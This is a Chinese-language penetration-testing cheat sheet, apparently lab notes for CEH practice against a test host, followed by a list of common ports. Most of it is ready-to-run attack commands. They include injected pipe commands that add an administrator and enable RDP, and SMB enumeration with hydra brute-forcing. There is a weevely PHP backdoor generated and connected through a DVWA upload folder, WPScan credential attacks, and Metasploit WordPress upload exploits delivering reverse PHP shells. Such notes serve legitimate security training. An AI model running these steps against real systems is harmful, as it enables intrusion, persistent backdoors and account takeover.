


## 連結
- [https://www.cvedetails.com](https://www.cvedetails.com)
- [https://www.exploit-db.com/](https://www.exploit-db.com/)



## linux
```bash
sudo systemctl start ssh
sudo su

# 查網關
ip route
ifconfig
route -n


# 加使用者cehp、並給sudo
sudo useradd cehp
sudo passwd cehp #會提示你輸入密碼
cut -d: -f1 /etc/passwd | grep cehp
sudo usermod -aG sudo cehp # 或sudo usermod -aG wheel cehp
getent group sudo # getent group wheel
```

## windows
```powershell
ifconfig

# 共享資料夾
net use \\10.10.10.16 apple /u:martin
net view \\10.10.10.16

# 管道
echo 123 | whoami
| net user cehp /add
| net users
| net localgroup Administrators cehp /add
| net localgroup Administrators
| reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Terminal Server" /vfDenyTSConnections /t REG_DWORD /d 0 /f
| netstat -an | findstr :3389

net user cehp
```


常用服務和Port

22：SSH（Secure Shell），用於安全遠程登錄。
23：Telnet，非加密的遠程登錄服務。
25：SMTP（Simple Mail Transfer Protocol），用於傳輸電子郵件。
53：DNS
80：HTTP（Hypertext Transfer Protocol），用於網頁傳輸。
88：Kerberos，一种AD网络身份验证协议，广泛用于基于票据的身份验证机制
123：NTP（Network Time Protocol），用於時間同步。
135：RPC（Remote Procedure Call），用於遠程進程調用。
137（UDP/TCP）：NetBIOS Name Service，用于将计算机名称解析为 IP 地址，类似于 DNS 的功能，但适用于 NetBIOS 网络。NetBIOS 是一种老旧协议，在现代网络中逐渐被替代（如 DNS 和 SMB 直接使用 TCP/445）。
138（UDP）：NetBIOS Datagram Service，用于在局域网中发送广播消息（如发送网络通知）。
139（TCP）：NetBIOS Session Service，用于建立和维护基于 NetBIOS 的会话，支持文件共享、打印机共享等功能。
161：SNMP，簡單網管。网络设备通过 SNMP 向管理系统报告状态，或者允许管理系统更改设备配置。SNMPv1、SNMPv2c： 明文传输，安全性较低。SNMPv3： 提供认证和加密功能，增强安全性。
389：LDAP（Lightweight Directory Access Protocol），用於訪問目錄服務。
443：HTTPS（HTTP over SSL/TLS），加密的網頁傳輸。
445：SMB（Server Message Block），微軟的檔案、印表機。用於共享文件和資源。
636：LDAPS（LDAP over SSL/TLS），加密的 LDAP。
1900：是 UPnP（通用即插即用） 的核心协议之一。SSDP 用于在局域网中发现网络设备（如打印机、路由器、媒体服务器等）。
2049：NFS（Network File System），用於文件系統共享。
3268：Microsoft Global Catalog，Active Directory 全局编录服务
3389：RDP
5353：Zerocon
48101：常見於物聯網（IOT）設備，特別是 Mirai C&C（Command and Control）。






```bash
snmp-check 10.10.10.16
nbtscan 10.10.10.1-254
enum4linux 10.10.10.16
enum4linux -u martin -p apple -a 10.10.10.16
hydra -L win32-users.txt -P /usr/share/wordlists/nmap.lst smb://10.10.10.16


# 列舉分享資料夾
python3 -m pip install --upgrade impacket
crackmapexec smb 10.10.10.16 -u martin -p apple --shares
```




## 製作後門php
```bash
weevely generate cehp backdoor.php #cehp為後門密碼
weevely http://10.10.10.16:8080/dvwa/hackable/uploads/backdoor.php cehp
```


## WPScan
```bash
whatweb http://10.10.10.16:8080/ceh
wpscan --url http://10.10.10.16:8080/ceh -e u # -e u表示列舉使用者
wpscan --url http://10.10.10.16:8080/ceh -P /usr/share/wordlists/nmap.lst # -e u表示列舉使用者
wpscan --url http://10.10.10.16:8080/ceh --api-token
```



## Metasploit
```bash
sudo service postgresql start
msfconsole

use exploit/unix/webapp/wp_admin_shell_upload
show info
set RHOSTS 10.10.10.16
set RPORT 8080
set TARGETURI /ceh
set USERNAME admin
set PASSWORD qwerty@123
set PAYLOAD php/reverse_php
exploit
```

```bash
msfconsole
use exploit/unix/webapp/wp_photo_gallery_unrestricted_file_upload
show info
set RHOSTS 10.10.10.16
set RPORT 8080
set TARGETURI /ceh
set USERNAME cehuser1
set PASSWORD green
set PAYLOAD php/reverse_php
exploit
```


### 外掛
[https://downloads.wordpress.org/plugin/photo-gallery.1.2.5.zip](https://downloads.wordpress.org/plugin/photo-gallery.1.2.5.zip)

